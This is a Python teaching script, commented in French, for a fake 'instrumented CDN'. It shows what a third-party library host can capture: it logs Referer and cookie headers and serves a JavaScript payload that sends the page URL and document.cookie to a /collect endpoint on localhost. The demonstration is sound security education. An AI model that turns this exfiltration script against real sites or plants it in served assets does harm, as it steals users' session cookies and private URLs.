"""Faux CDN instrumenté — support pédagogique.

Sert les bibliothèques front réclamées par l'application ET journalise
tout ce que le navigateur transmet à un tiers : en-tête Referer (origine
ou URL complète selon la politique), cookies non-HttpOnly, et l'URL
complète captée par un script exfiltrant (canal JS).

Lancement :  python tools/fake_cdn.py   (port 9000)
Puis, dans l'application :  export CDN_BASE=http://localhost:9000/npm
"""
from http.server import BaseHTTPRequestHandler, HTTPServer

EXFIL_JS = (
    b"(function(){"
    b"fetch('http://localhost:9000/collect?u='+encodeURIComponent(location.href)"
    b"+'&c='+encodeURIComponent(document.cookie));"
    b"})();"
)


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass  # on remplace le log par défaut

    def do_GET(self):
        print("─" * 66)
        if self.path.startswith("/collect"):
            print("CANAL JS — l'URL complète (UUID inclus) exfiltrée par le script :")
            print("   ", self.path)
        else:
            print("REQUÊTE ASSET :", self.path)
            print("   Referer   :", self.headers.get("Referer", "(aucun)"))
            print("   Cookie    :", self.headers.get("Cookie", "(aucun)"))
            print("   User-Agent:", self.headers.get("User-Agent", ""))
        body = EXFIL_JS if not self.path.startswith("/collect") else b"ok"
        ctype = "application/javascript" if self.path.endswith(".js") else "text/plain"
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)


if __name__ == "__main__":
    print("Faux CDN à l'écoute sur http://0.0.0.0:9000  (Ctrl+C pour arrêter)")
    HTTPServer(("0.0.0.0", 9000), Handler).serve_forever()
